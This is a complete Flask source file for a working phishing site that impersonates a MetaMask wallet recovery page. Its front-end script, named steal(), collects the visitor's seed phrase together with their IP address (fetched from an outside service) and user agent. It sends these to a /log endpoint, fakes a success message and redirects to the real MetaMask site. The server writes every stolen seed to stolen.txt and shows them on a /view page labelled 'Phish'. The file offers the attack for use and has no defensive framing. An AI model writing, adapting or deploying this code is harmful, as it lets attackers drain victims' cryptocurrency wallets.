from flask import Flask, request, render_template_string, jsonify
import json, datetime

app = Flask(__name__)

HTML = '''
<!DOCTYPE html>
<html><head><title>MetaMask Recovery</title>
<style>body{font-family:Arial;background:#1a1a1a;color:#fff;padding:20px;text-align:center;}
input,button{padding:15px;margin:10px;width:90%;font-size:18px;}</style></head>
<body>
<h1>🔐 MetaMask Wallet Recovery</h1>
<p>Enter your 12/24-word seed phrase below to restore access.</p>
<input type="text" id="seed" placeholder="word1 word2 word3 ...">
<button onclick="steal()">Recover Wallet</button>
<script>
async function steal() {
  const seed = document.getElementById('seed').value.trim();
  if (seed.split(' ').length >= 12) {
    const ip = await (await fetch('https://api.ipify.org')).text();
    await fetch('/log', {method:'POST',headers:{'Content-Type':'application/json'},
      body:JSON.stringify({seed,ip,ua:navigator.userAgent})});
    alert('Recovery Successful! Redirecting...');
    setTimeout(() => location.href='https://metamask.io', 1000);
  }
}
</script>
</body></html>
'''

@app.route('/')
def home():
    return render_template_string(HTML)

@app.route('/log', methods=['POST'])
def log():
    data = request.get_json()
    data['time'] = datetime.datetime.now().isoformat()
    
    with open('stolen.txt', 'a') as f:
        f.write(json.dumps(data) + '\n')
    
    return jsonify({"status":"success"})

@app.route('/view')
def view():
    try:
        with open('stolen.txt', 'r') as f:
            logs = f.read()
        return f"<pre>{logs}</pre><br><a href='/'>Back to Phish</a>"
    except:
        return "No seeds yet. <a href='/'>Phish</a>"

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=10000)
